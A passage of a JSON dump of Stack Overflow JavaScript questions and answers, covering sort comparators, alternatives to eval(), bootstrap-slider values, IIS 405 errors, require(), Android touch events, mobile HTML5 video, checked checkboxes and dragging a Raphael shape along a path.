<em>again</em>, and so usually the implementation will terminate. Still, it might do more or less swaps that actually had been unnecessary, and will therefore take longer than with a consistent comparison function.</p>\n\n<blockquote>\n  <p>And are there any other good reasons for not returning zero at all?</p>\n</blockquote>\n\n<p>Being lazy and hoping that the array does not contain duplicates.</p>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>I recently read many answers about sorting in JavaScript and I often stumble upon a compare function that looks like this:</p>\n\n<pre><code>array.sort(function(a,b){ a &gt; b ? 1 : -1; });\n</code></pre>\n\n<p>So it is a compare function that returns 1 if <code>a</code> is greater than <code>b</code> and -1 if <code>a</code> is less than OR EQUAL TO <code>b</code>. As described on MDN (<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort\">link</a>), a compare function can also return zero, to ensure that the relative position of two items remains unchanged:</p>\n\n<blockquote>\n  <p>If compareFunction(a, b) returns 0, leave a and b unchanged with\n  respect to each other, but sorted with respect to all different\n  elements.</p>\n</blockquote>\n\n<p>So the official examples look more like this:</p>\n\n<pre><code>function compare(a, b) {\n  if (a &lt; b) return -1;\n  if (a &gt; b) return 1;\n  return 0;\n}\n</code></pre>\n\n<p>And indeed, by adding a <code>return 0</code> statement, the sorting algorithm often needs less iterations and runs faster in total (<a href=\"http://jsperf.com/sorting-function-return-zero\">JSPerf</a>).</p>\n\n<p>So I was wondering if there is any advantage on omitting a <code>return 0</code> statement.</p>\n\n<p>I realized that on MDN, it also says:</p>\n\n<blockquote>\n  <p>Note: the ECMAscript standard does not guarantee this behaviour, and\n  thus not all browsers (e.g. Mozilla versions dating back to at least\n  2003) respect this.</p>\n</blockquote>\n\n<p>referring to the behavior, that <code>a</code> and <code>b</code> should remain unchanged if 0 is returned. So maybe, by returning 0, we get a slightly different sorted array in different browsers? Could that be a reason? And are there any other good reasons for not returning zero at all?</p>\n",
            "last_activity_date": 1388754191,
            "question_id": 20883421,
            "score": 8,
            "tags": [
                "javascript",
                "sorting"
            ],
            "title": "Sorting in JavaScript: Should every compare function have a &quot;return 0&quot; statement?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>maybe using <code>window['var' + num]</code> might be more useful for you. i don't quite understand your question sorry.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>do you mean that you want to calculate an equation that you can't know until you've received it?</p>\n\n<p>if so see <a href=\"http://stackoverflow.com/questions/6479236/calculate-string-value-in-javascript-not-using-eval\">Calculate string value in javascript, not using eval</a> . </p>\n\n<h2><strong>in short:</strong></h2>\n\n<p>eval CAN be used sometimes, but only if the equation string comes from a trusted source, and there you need something like <strong>evaluating dynamic equations</strong>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Javascript is a very flexible language in this regard. There are very <em>very</em> few cases where <code>eval()</code> is the right answer to any given question, and it certainly isn't necessary here.</p>\n\n<p>If your <code>a</code> and <code>b</code> variables are part of an object, you can access them with string subscripts:</p>\n\n<p>ie <code>myobj.a</code> could also be referenced as <code>myobj['a']</code>.</p>\n\n<p>From that, you can use a variable for the subscript, and thus you can reference any element in <code>myobj</code> dynamically -- ie:</p>\n\n<pre><code>var myobj = {a : 5, b : 10};\n\nvar dynamicProperty1 = 'a';\nvar dynamicProperty2 = 'b';\n\n//gives 15.\nalert( myojb[dynamicProperty1] + myojb[dynamicProperty1] );\n</code></pre>\n\n<p>No <code>eval()</code> required. You can build the <code>dynamicProperty</code> strings however you wish, so there's virtually infinite flexibility.</p>\n\n<p>If your <code>a</code> and <code>b</code> variables are globals, JS globals in the browser are actually children of the <code>window</code> object, so you can still use this technique even with globals.</p>\n\n<p>ie your global variable <code>a</code> could also be accessed via <code>window.a</code> or <code>window['a']</code>, with the latter option allowing you to do the same <code>dynamicProperty</code> trick described above.</p>\n\n<p>Hope that helps.</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I work mainly with javascript, Jquery, knockout, etc</p>\n\n<p>The thing that attracted eval() to me is</p>\n\n<pre><code>var a = 5;\nvar b = 10;\neval(\"a+b\");\n//Gives me output 15\n</code></pre>\n\n<p>Note: I work in cases where the value of <code>a</code> and <code>b</code> changes dynamically</p>\n\n<p>In my work I'm dealing with a lot of dynamic objects from json, knockout, etc. So eval solves most of my problems. \nBut as I read I found there are so many issues with eval() like slowing down etc. </p>\n\n<p>I searched a lot and haven't found any substitute for eval() when i have to evaluate equation obtaining as string into equation as object.</p>\n\n<p>Can anyone suggest a plugin or function alternative to eval() keeping in mind the example i have given above</p>\n\n<p><strong>Problem:</strong></p>\n\n<p><em>I'm creating a Table from Json data using knockout mapping. So that what ever the format of json is the table is generated. I also calculate some field using knockout computed.\nRight now I use hard-coded</em> </p>\n\n<pre><code>self.Salary = ko.computed(function(){ return self.salaryEqn() &amp;&amp; eval(self.salaryEqn()).toFixed(2); })\nself.salaryEqn(salEqnTxt); \n</code></pre>\n\n<p><em>I want to execute these equations dynamic. I can create it dynamicaly as string but to eval them is the issue I'm facing.</em></p>\n\n<p><strong>I want solution for</strong></p>\n\n<p>Is there a way to calculate a formula stored in a string in JavaScript without using eval?</p>\n\n<p>Like a formula</p>\n\n<pre><code> \"self.Salary = ko.computed(function(){ return self.salaryEqn() &amp;&amp; eval(self.salaryEqn()).toFixed(2); })\"\n</code></pre>\n",
            "last_activity_date": 1366174232,
            "question_id": 16037033,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "jquery-plugins",
                "eval"
            ],
            "title": "Alternative to eval() javascript"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I think it's currently broken.</p>\n\n<p>Documentation states:</p>\n\n<blockquote>\n  <p>Methods</p>\n  \n  <p>.slider('getValue')</p>\n  \n  <p>Get the value.</p>\n</blockquote>\n\n<p>How ever, calling <code>$('#sliderDivId').slider('getValue')</code> returns the jQuery selector rather than the value...</p>\n\n<p>For now you could manually grab it from the data object...\n<code>$('#sliderDivId').data('slider').getValue()</code></p>\n",
                    "is_accepted": false,
                    "score": 34
                },
                {
                    "body": "<p>fast fix:</p>\n\n<pre><code>$.fn.slider = function (option, val) {\n\n    if (typeof option == 'string') {\n        if (this.length) {\n            var data = this.eq(0).data('slider');\n            if (data)\n                return data[option](val);\n\n            return null;\n        }\n    }\n\n    return this.each(function () {\n        var $this = $(this),\n            data = $this.data('slider'),\n            options = typeof option === 'object' &amp;&amp; option;\n        if (!data) {\n            $this.data('slider', (data = new Slider(this, $.extend({}, $.fn.slider.defaults, options))));\n        }\n    })\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>At time of writing it's a bit flaky but you can make it work:</p>\n\n<p>1/ Make sure you specify an empty range starting \"value[0]\". Unless you do this its internal value field becomes undefined e.g.</p>\n\n<pre><code>$('#setBidDialogSlider').slider({ value: [0], max: max, step: 0.2, formater: function(v) { return v.toFixed(2)+\"BTC\" } });\n</code></pre>\n\n<p>2/ Now finally you can catch the value in the event</p>\n\n<pre><code>$('#setBidDialogSlider').slider().on('slide', function(ev) {\n    $scope.dialog.order_value = ev.value*$scope.dialog.price;\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I know I'm late but this is still broken but to fix it open up <code>bootstrap-sliders.js</code> and inject these three things:</p>\n\n<p>the very end of the first function: <code>Slider</code>:</p>\n\n<pre><code>this.calculateValue();\n</code></pre>\n\n<hr>\n\n<p>right before:<code>return val;</code> in the <code>calculateValue</code> function</p>\n\n<pre><code>grandVal = val;\n</code></pre>\n\n<hr>\n\n<p>after the <code>$.fn.slider</code> function:</p>\n\n<pre><code>$.fn.sliderValue = function(){\n    return grandVal;\n};\nvar grandVal;\n</code></pre>\n\n<p>Now you can access the value by <code>$('#MySliderId').sliderValue()</code></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>How to get the values of the slider bootstrap to hidden iputs?</p>\n\n<pre><code> &lt;input type=\"hidden\" name=\"min_value\" id=\"min_value\" value=\"\"&gt;\n &lt;input type=\"hidden\" name=\"max_value\" id=\"max_value\" value=\"\"&gt;\n\n $(function() {\n    $( \"#slider-range-s1\" ).slider({\n        range: true,\n        min: 0,\n        max: 500,\n        value: [ 0, 500 ]\n    });\n });\n</code></pre>\n",
            "last_activity_date": 1415169908,
            "question_id": 15736694,
            "score": 8,
            "tags": [
                "javascript",
                "twitter-bootstrap",
                "slider",
                "bootstrap-slider"
            ],
            "title": "How to get the value of the slider bootstrap?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>A 405 is thrown by IIS when an HTTP verb(GET,PUT,POST,DELETE,HEAD,etc.) is requested and is not supported/disallowed by the designated handler.</p>\n\n<p>You'll need to open the IIS manager -> Default Web Site -> Handler Mappings (Or the handler mappings specific to your web-application)</p>\n\n<p><img src=\"http://i.stack.imgur.com/lIpAi.png\" alt=\"enter image description here\"></p>\n\n<p>In here you'll need to play with the handler mappings as one of them is not allowing \"POST\" verbs. </p>\n\n<p>As you are not posting to any specific page (.aspx, .ashx, etc.), it will be difficult to identify the exact handler that is causing you issues. </p>\n\n<p>Handlers of interest may be: </p>\n\n<ul>\n<li>ExtensionlessUrlHandler-ISAPI-4.0_32bit /64bit</li>\n<li>StaticFile</li>\n</ul>\n\n<p>Once you identify the handler your request is being routed to, double click it to open the dialogue. </p>\n\n<p><img src=\"http://i.stack.imgur.com/oWh7q.png\" alt=\"enter image description here\"></p>\n\n<p>From there click \"Request Restrictions\" then \"Verbs\" </p>\n\n<p>Make sure the appropriate verb is present in the text area. </p>\n\n<p><img src=\"http://i.stack.imgur.com/P1BVK.png\" alt=\"enter image description here\"></p>\n\n<p>As I mentioned before, I'm not sure which handler is handling your request as you are not posting to any particular page (you may have URL re-writing in place that is routing your request appropriately).</p>\n\n<hr>\n\n<p>If the above fails, you may need to check if WebDAV Publishing is installed and remove it (restart required).</p>\n\n<p><img src=\"http://i.stack.imgur.com/dMZrq.png\" alt=\"WebDAV\"></p>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>Maybe you should modify your post'URl format like this:    </p>\n\n<pre><code>$.post('@Url.Content(\"~/Attach/UpdateAttach\")'\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>some users here are having shared hosting and not dedicated servers, so they might not be able to get access to the IIS control panel..</p>\n\n<p>this is my case and here is what I found..</p>\n\n<p>I have my web application on the root directory created through Godaddy control panel.. and the POST request is acknowledged .. </p>\n\n<p>then I used the FileZilla to create a testing folder for my jquery ..( notice i used FileZilla , so the web application and hence the IIS of GoDaddy is not aware that I wanted this folder to be part of my we application )</p>\n\n<p>then whenever I test this jQuery on this testing folder.. I get that error [405 Method not allowed]..</p>\n\n<p>the solution was extremely simple :</p>\n\n<p>I moved my testing page out of that testing folder created by FileZilla and located it inside a folder that was created through Godaddy control panel ( in this case the IIS will be aware that this page is part of my web application :) )</p>\n\n<p>Hope that will help those on Shared hosting</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am trying to host an ASP.NET MVC4 web application with IIS 7.5. When debugging the app everything works fine (I'm assuming this is because of Windows Authentication). \nHowever, when I publish the app and browse to it I get a 405 Method not allowed error:</p>\n\n<pre><code>POST http://localhost/ 405 (Method Not Allowed)\nsend \ni.extend.ajax \ni.(anonymous function)\n(anonymous function)\n</code></pre>\n\n<p>From what I've been reading this is either a problem with the Handler Mappings in IIS or some configuration is needed in the web.config. Either way, I have not found the correct solution.\nCould anyone tell me what my web.config should include to all POSTS? And/or how to set up the correct Handler mapping in IIS, as I am new to web development and find the number of options a bit overwhelming.</p>\n\n<p>The piece of javascript that throws the error is the following:</p>\n\n<pre><code>$.post(\"/\", { latitude: locLat, longitude: locLon, username: $('#onlineUsers').attr('itemid') });\n</code></pre>\n",
            "last_activity_date": 1394266421,
            "question_id": 13258014,
            "score": 8,
            "tags": [
                "javascript",
                "jquery",
                "asp.net-mvc-4",
                "iis-7.5"
            ],
            "title": "jQuery POST, Error 405 Method not allowed"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>The <code>require()</code> idiom is part of a specification known as <a href=\"http://wiki.commonjs.org/wiki/CommonJS\" rel=\"nofollow\">CommonJS</a>. Specifically, that part of the spec is called 'Modules'. <a href=\"http://requirejs.org/\" rel=\"nofollow\">RequireJS</a> is just one implementation of CommonJS (and it's usually a browser-side implementation - in fact, it takes a <a href=\"http://requirejs.org/docs/whyamd.html\" rel=\"nofollow\">different approach</a> because of the asynchronous nature of the browser).</p>\n\n<p>If you look at the list of implementations on the CommonJS site, you'll <a href=\"http://wiki.commonjs.org/wiki/Implementations/node.js\" rel=\"nofollow\">see Node.js listed</a>. Notice that it implements 'Modules'. Hence, that's where it's coming from - it's very much built-in.</p>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>The <code>require</code> in PhantomJS and Node.js means exactly the same with the difference that none of the base modules match. Although the <code>fs</code> module exists for both, they are different and do not provide the same functions.</p>\n\n<p><code>require</code> is functionally the same in PhantomJS and Node.js. CasperJS is built on top of PhantomJS and uses its <code>require</code> function, but also patches it. With CasperJS it is also possible to require a module with its name such as <code>require('module')</code> instead of <code>require('./module')</code> if it is in the same directory.</p>\n\n<p>Full matrix (file.js is in the same directory as the executed script):</p>\n\n<pre>\n            | node\n            |   | phantom\n            |   |   | casper\n            |   |   |   | slimer\n------------+---+---+---+--------\nfile        | n | n | y | y\n./file      | y | y | y | y\nfile.js     | n | n | n | n\n./file.js   | n | n | n | n\n</pre>\n\n<p>PhantomJS can also use modules defined in the special folder <code>node_modules</code> in the same way that node does. It cannot use actual node modules that have dependencies to modules that are not present in PhantomJS. </p>\n\n<h2>Examples of what can be required:</h2>\n\n<h3>m.js (for functions)</h3>\n\n<pre><code>module.exports = function(){\n    return {\n        someKey: [1,2,3,4],\n        anotherKey: function(){\n            console.log(\"module exports works\");\n        }\n    }\n};\n</code></pre>\n\n<h3>e.js (for everything else as JS)</h3>\n\n<pre><code>exports.someKey = {\n    innerKey: [1,2,3,4]\n};\n\nexports.anotherKey = function(){\n    console.log(\"exports works\");\n};\n</code></pre>\n\n<h3>a.json (arbitrary JSON)</h3>\n\n<pre><code>[\n    {\n        \"someKey\": [ 1,2,3,4 ],\n        \"anotherKey\": 3\n    }\n]\n</code></pre>\n\n<h3>script.js</h3>\n\n<pre><code>var m = require(\"./m\")();\nm.anotherKey(); // prints \"module exports works\"\n\nvar e = require(\"./e\");\ne.anotherKey(); // prints \"exports works\"\n\nvar a = require(\"./a\");\nconsole.log(a[0].anotherKey); // prints \"3\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I usually find this as the first line in node.js scripts/modules as well as phantomJS, casperJS etc. I'm curious, if this is a common pattern for server-side javascript (SSJS) (similar to <code>#include</code> in C/C++ or <code>import</code> in Java) or is it a a library like RequireJS or LabJS that is being called for this inclusion (neither of which I have gotten a chance to use in practice, as yet)?</p>\n\n<p>e.g. <code>var http = require('http')</code> or <code>var casper = require('casper').create()</code></p>\n\n<p>I'm curious if this is a pattern that has become <em>standardized</em> for SSJS or does every library/tool call an existing function?</p>\n\n<p>Please pardon the <em>n00b</em> dimension to the question but I would like to know the 'why' behind its omnipresence :)</p>\n",
            "last_activity_date": 1418806878,
            "question_id": 11551861,
            "score": 8,
            "tags": [
                "javascript",
                "require"
            ],
            "title": "Is &#39;require(...)&#39; a common javascript pattern or a library function?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I can't really tell you why this is happening, but I came across a similar problem, when registering for documents touch events. When I registered for only touch move events, I had exactly the same problem you are experiencing, however when I registered for touchstart too, it suddenly worked. In your case, just add the following lines to your main.js</p>\n\n<pre><code>function touchHandlerDummy(e)\n{\n    e.preventDefault();\n    return false;\n}\ndocument.addEventListener(\"touchstart\", touchHandlerDummy, false);\ndocument.addEventListener(\"touchmove\", touchHandlerDummy, false);\ndocument.addEventListener(\"touchend\", touchHandlerDummy, false);\n</code></pre>\n\n<p>Works on my Galaxy Tab. Hope this is what you were trying to do.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>this will do the trick :) </p>\n\n<blockquote>\n  \n  function touchHandlerDummy(e)\n  {\n    e.preventDefault();\n    return false;\n  }\n  document.addEventListener(\"touchmove\", touchHandlerDummy, false);\n  \n</blockquote>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I had the very same problem. Magically enough, the problem disappeared completely when I added the following line to the <code>&lt;header&gt;</code> section:</p>\n\n<pre><code>&lt;meta name=\"viewport\" content=\"width=device-width\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Answers here helped me a lot.</p>\n\n<p>My solution is simply combination of what has been mentioned here, so if you want:\n<br/>1. \"drag and drop\" on Samsung Galaxy S2 native browser (Android 4.1.2)\n<br/>2. disable user scaling the page (viewport set to no scaling)</p>\n\n<pre><code>&lt;head&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1.01\"&gt;\n    &lt;script&gt;\n        window.addEventListener(\"load\", function() {\n            function onTouchPreventDefault(event) { event.preventDefault(); };\n            document.addEventListener(\"touchmove\", onTouchPreventDefault, false);\n            document.addEventListener(\"touchstart\", onTouchPreventDefault, false);\n        }, false);\n    &lt;/script&gt;\n&lt;/head&gt;\n</code></pre>\n\n<ol>\n<li><p>Viewport<br/>\n<code>\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1.01\"&gt;\n</code></p>\n\n<ul>\n<li>unfortunately user can still zoom the page in a little bit, 1.01 is the smallest value that does the job</li>\n</ul></li>\n<li><p>Disable pinch to zoom<br/>\n<code>document.addEventListener(\"touchmove\", function (event) { event.preventDefault(); }, false);\n</code></p>\n\n<ul>\n<li>this disables pinch to zoom</li>\n</ul></li>\n<li><p>Disable double tap to zoom<br/>\n<code>document.addEventListener(\"touchstart\", function (event) { event.preventDefault(); }, false);\n//OR\ndocument.addEventListener(\"touchend\", function (event) { event.preventDefault(); }, false);\n</code></p>\n\n<ul>\n<li>this disables double tap to zoom, you can choose if you want to use touchstart or touchend (or both) for this purpouse</li>\n</ul></li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>On <em>some</em> android's native browser touching the page seems to stop the display from being updated until the finger is released. This occurs for both html element based animation (switching classes) and for canvas based animation. It does not however stop normal js execution and other events are fired as normal. On devices with this problem the dolphin browser also seems effected (not firefox though).</p>\n\n<p>Touchstart/move both have preventDefault() fired as well as stopPropergation(), cancelBubble = true; and e.returnValue = false;. In the CSS webkit selection has also been disabled. The page will not scroll.</p>\n\n<p>A similar question has been asked here: \n<a href=\"http://stackoverflow.com/questions/5361406/does-android-browser-lock-dom-on-touchstart\">Does Android browser lock DOM on touchStart?</a></p>\n\n<p>but I'd like to find out if this behaviour can be overcome, or at least to discover what devices will be effected by the problem, is it a device or version android issue? If you cannot answer the question running the demo and reporting your experience along with your device model and useragent (displayed at bottom of demo page) as a comment might help others or myself answer the question.</p>\n\n<p>Here is a demo and steps to reproduce the behaviour. A QR code for the link can be found here <a href=\"https://s3-eu-west-1.amazonaws.com/canvas-test-pd/tmp.png\">https://s3-eu-west-1.amazonaws.com/canvas-test-pd/tmp.png</a>.</p>\n\n<p><a href=\"https://s3-eu-west-1.amazonaws.com/canvas-test-pd/index.html\">https://s3-eu-west-1.amazonaws.com/canvas-test-pd/index.html</a></p>\n\n<p>The web page has a canvas at the top and a div with a background image at the bottom. Every second the canvas is cleared and a different image displayed and the div has it's class switched (both toggle between 0 and 1 pngs). Once this has toggled a few times place your finger on the canvas (the top grey box) and hold it there. Wait to see if the animation continues (sometimes it will once or twice then stops) and if there are any visual distortions. </p>\n\n<p><strong>Update</strong>\nIt seems that the Galaxy Tab running 3.2 requires handlers for touchstart/end of document, not just required divs for the screen to continue updating the display. Thanks jimpic.</p>\n\n<p>I'm starting to believe it's an issue caused by manufacturers skins, although this is difficult to prove.</p>\n",
            "last_activity_date": 1400594270,
            "question_id": 10246305,
            "score": 8,
            "tags": [
                "javascript",
                "android",
                "android-2.3-gingerbread"
            ],
            "title": "Android browser touch events stop display being updated inc. canvas/elements - How to work around?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>I think there's no way.  Have you considered a workaround like animated gifs?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Hmm, I'm not sure about Android but <a href=\"https://developer.apple.com/library/safari/#documentation/AudioVideo/Conceptual/Using_HTML5_Audio_Video/Device-SpecificConsiderations/Device-SpecificConsiderations.html\">iOS devices can't run multiple video streams simultaneously</a>:</p>\n\n<blockquote>\n  <p><strong>Multiple Simultaneous Audio or Video Streams</strong></p>\n  \n  <p>Currently, all devices running iOS are limited to playback of a single\n  audio or video stream at any time. Playing more than one video\u2014side by\n  side, partly overlapping, or completely overlaid\u2014is not currently\n  supported on iOS devices. Playing multiple simultaneous audio streams\n  is also not supported. You can change the audio or video source\n  dynamically, however. See \u201cReplacing a Media Source Sequentially\u201d for\n  details.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>No, Android or iOS devices (ie. mobile webkit) are not able to run video as you are wanting . Video will open in a default video player of device.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>YouTube uses a mov or mp4 with ios to load the native look and feel for videos, or it links out to their app to play the video since it's installed on every ios device.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Why do you need <code>windows.onload</code> to bypass autoplay? If I remember correctly setting the <code>preload</code> tag to none</p>\n\n<pre><code>&lt;video src=\"vid.mov\" preload=\u201dnone\u201d&gt;&lt;/video&gt;\n</code></pre>\n\n<p>should work.</p>\n\n<p>Also, have you tried using the <a href=\"http://sandbox.thewikies.com/vfe-generator/\" rel=\"nofollow\">Video For Everybody</a> approach? With that should be able to get the video to play in the web page rather than by the phone's OS, that way I believe you can achieve the same effect on supported devices.</p>\n\n<p><strong>EDIT:</strong> In regards to <a href=\"http://stackoverflow.com/questions/9000624/html5-video-behavior-on-mobile-devices/9764151#9764151\">j08691's answer</a>, an alternative approach for iPhones could be to design a simple web viewer app for the site for iPhone which has a <a href=\"http://iosguy.com/2012/01/11/multiple-video-playback-on-ios/\" rel=\"nofollow\">workaround</a> for the no-multiple video playing problem.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I am building a site where I have several <code>&lt;video&gt;</code> elements (looped animations) that act as part of my design (not as an actual video). This works quite well in desktop browsers, yet I am in trouble on mobile devices.<br/>When I display the site on Android or iOS devices (ie. mobile webkit) I will get the OS's video player appearance and the videos will open in some sort of popup when I click them. I do know that I can bypass the autoplay restrictions by doing sth like:</p>\n\n<pre><code>window.onload = function() {\n    var pElement = document.getElementById(\"myVideo\");\n    pElement.load();\n    pElement.play();\n};\n</code></pre>\n\n<p>But this will again open the video(s) in a seperate window...</p>\n\n<p>Does anyone know of a possibility to emulate / enable desktop-like behavior on mobile devices? Thanks!</p>\n\n<p><strong>EDIT:</strong>\nMarkup is basic <code>&lt;video&gt;</code>-syntax btw:</p>\n\n<pre><code>&lt;video autoplay loop&gt;\n    &lt;source src=\"vid.mp4\" type=\"video/mp4\" /&gt;\n    &lt;source src=\"vid.ogg\" type=\"video/ogg\" /&gt;\n    &lt;source src=\"vid.webm\" type=\"video/webm\" /&gt;\n&lt;/video&gt;\n</code></pre>\n",
            "last_activity_date": 1332622229,
            "question_id": 9000624,
            "score": 8,
            "tags": [
                "javascript",
                "html5",
                "mobile",
                "html5-video",
                "mobile-webkit"
            ],
            "title": "HTML5 video behavior on mobile devices"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>A simple for loop which tests the <code>checked</code> property and appends the checked ones to a separate array. From there, you can process the array of <code>checkboxesChecked</code> further if needed.</p>\n\n<pre><code>// Pass the checkbox name to the function\nfunction getCheckedBoxes(chkboxName) {\n  var checkboxes = document.getElementsByName(chkboxName);\n  var checkboxesChecked = [];\n  // loop over them all\n  for (var i=0; i&lt;checkboxes.length; i++) {\n     // And stick the checked ones onto an array...\n     if (checkboxes[i].checked) {\n        checkboxesChecked.push(checkboxes[i]);\n     }\n  }\n  // Return the array if it is non-empty, or null\n  return checkboxesChecked.length &gt; 0 ? checkboxesChecked : null;\n}\n\n// Call as\nvar checkedBoxes = getCheckedBoxes(\"mycheckboxes\");\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 26
                }
            ],
            "body": "<p>I have a set of input checkboxes with same name\nand I would like determine which checkboxes have been checked using javascript, how can I achieve that?\nI know only how to get all the checkboxes as follows:</p>\n\n<pre><code>var checkboxes = document.getElementsByName('mycheckboxes');\n</code></pre>\n",
            "last_activity_date": 1367161502,
            "question_id": 8563240,
            "score": 8,
            "tags": [
                "javascript",
                "html"
            ],
            "title": "How to get all checked checkboxes"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>A circle object has an x,y coordinate for its center, and a radius. To make sure the circle remains on the line, simply find the intersection of the center of the circle and the line itself.</p>\n\n<p>To do this, you will need to store the start and end coordinates of your line. Then using the equation of a line: y = mx + b, you can find the slope and y-intercept. Once you have a function for the line, you can generate new coordinates for the circle by plugging in different values of x. </p>\n\n<p>Also, by plugging in the x,y coordinates of the circle into your function, you can check to see if the circle is on the line.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You didn't specify exactly how you want the interaction to work, so I used what feels most natural to me.</p>\n\n<p>We can assume the dot must remain on the path, so its position must be given by</p>\n\n<pre><code>p.getPointAtLength(l);\n</code></pre>\n\n<p>for some <code>l</code>. To find <code>l</code> we can search for the <em>local</em> minimum of the distance between the curve and the cursor position. We initialize the search with <code>l0</code> where <code>l0</code> is the value of <code>l</code> <em>currently</em> defining the location of the dot.</p>\n\n<p>See the JSfiddle here for a working example:</p>\n\n<p><a href=\"http://jsfiddle.net/fuzic/kKLtH/\">http://jsfiddle.net/fuzic/kKLtH/</a></p>\n\n<p>Here is the code:</p>\n\n<pre><code>var searchDl = 1;\nvar l = 0;\n\n// Creates canvas 320 \u00d7 200 at 10, 50\nvar r = Raphael(10, 50, 320, 200);\n\nvar p = r.path(\"M100,100c0,50 100-50 100,0c0,50 -100-50 -100,0z\").attr({stroke: \"#ddd\"}),\n    pt = p.getPointAtLength(l);\n    e = r.ellipse(pt.x, pt.y, 4, 4).attr({stroke: \"none\", fill: \"#f00\"}),\n    totLen = p.getTotalLength(),\n\n\nstart = function () {\n    // storing original coordinates\n    this.ox = this.attr(\"cx\");\n    this.oy = this.attr(\"cy\");\n    this.attr({opacity: 1});\n},\nmove = function (dx, dy) {\n    var tmpPt = {\n        x : this.ox + dx, \n        y : this.oy + dy\n    };\n    l = gradSearch(l, tmpPt);\n    pt = p.getPointAtLength(l);\n    this.attr({cx: pt.x, cy: pt.y});\n},\nup = function () {\n    this.attr({opacity: 1});\n},\ngradSearch = function (l0, pt) {\n    l0 = l0 + totLen;\n    var l1 = l0,\n        dist0 = dist(p.getPointAtLength(l0 % totLen), pt),\n        dist1,\n        searchDir;\n\n    if (dist(p.getPointAtLength((l0 - searchDl) % totLen), pt) &gt; \n       dist(p.getPointAtLength((l0 + searchDl) % totLen), pt)) {\n        searchDir = searchDl;\n    } else {\n        searchDir = -searchDl;\n    }\n\n    l1 += searchDir;\n    dist1 = dist(p.getPointAtLength(l1 % totLen), pt);\n    while (dist1 &lt; dist0) {\n        dist0 = dist1;\n        l1 += searchDir;\n        dist1 = dist(p.getPointAtLength(l1 % totLen), pt);\n    }\n    l1 -= searchDir;\n\n    return (l1 % totLen);\n},\ndist = function (pt1, pt2) {\n    var dx = pt1.x - pt2.x;\n    var dy = pt1.y - pt2.y;\n    return Math.sqrt(dx * dx + dy * dy);\n};\ne.drag(move, start, up);\u200b\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 16
                }
            ],
            "body": "<p>I've this simple dummy file that I'm using to do some testing. The intended result is to drag the red circle along the path. The thing is that I can't figure out how to associate both shapes.</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;    \n    &lt;script src=\"raphael-min.js\"&gt;&lt;/script&gt;    \n&lt;/head&gt;\n&lt;body&gt;    \n&lt;script type=\"text/javascript\"&gt;    \n// Creates canvas 320 \u00d7 200 at 10, 50\nvar r = Raphael(10, 50, 320, 200);\n\nvar p = r.path(\"M100,100c0,50 100-50 100,0c0,50 -100-50 -100,0z\").attr({stroke: \"#ddd\"}),\n    e = r.ellipse(104, 100, 4, 4).attr({stroke: \"none\", fill: \"#f00\"}),\n\n\n/*var c = r.circle(100, 100, 50).attr({\n    fill: \"hsb(.8, 1, 1)\",\n    stroke: \"none\",\n    opacity: .5\n});*/\n\n\nvar start = function () {\n    // storing original coordinates\n    this.ox = this.attr(\"cx\");\n    this.oy = this.attr(\"cy\");\n    this.attr({opacity: 1});\n},\nmove = function (dx, dy) {\n    // move will be called with dx and dy\n    this.attr({cx: this.ox + dx, cy: this.oy + dy});\n},\nup = function () {\n    // restoring state\n    this.attr({opacity: 1});\n};\ne.drag(move, start, up);    \n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
            "last_activity_date": 1407754349,
            "question_id": 7406021,
            "score": 8,
            "tags": [
                "javascript",
                "graphics",
                "svg",
                "raphael"
            ],
            "title": "How to drag a shape along a given path"
        },
        {
            "answer_count": 6,
